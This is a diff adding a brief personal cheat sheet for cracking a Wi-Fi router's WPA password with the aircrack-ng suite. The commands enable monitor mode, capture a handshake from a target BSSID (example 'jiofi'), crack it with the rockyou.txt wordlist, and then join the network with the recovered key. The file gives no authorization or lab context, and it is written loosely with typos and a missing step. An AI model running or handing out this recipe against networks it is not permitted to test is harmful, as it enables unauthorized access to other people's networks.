@@ -1,0 +1,29 @@
+
+1. airmon-ng check kill
+
+2.airmon-ng start wlan0 for montior enabling
+
+3.airodump-ng wlan0mon
+New tab of kali linux
+
+4. airodump-ng wlan0mon --bssid (here)
+To write handshake in another text
+
+
+5. airodump-ng wlan0mon --bssid (here) --write examplename(jiofi)
+
+
+6.aircrack-ng -b(bssid) -w (drag the rockyou.txt) (examplename.cap 
+
+Running of the key phrase
+After finding the key
+to know the key was working or not
+in our linux
+we need to reset
+netwrok
+
+so, use the following commands
+sudo systemctl start NetworkManager
+sudo systemctl restart NetworkManager
+
+Now, check ssid of router and paste the key.
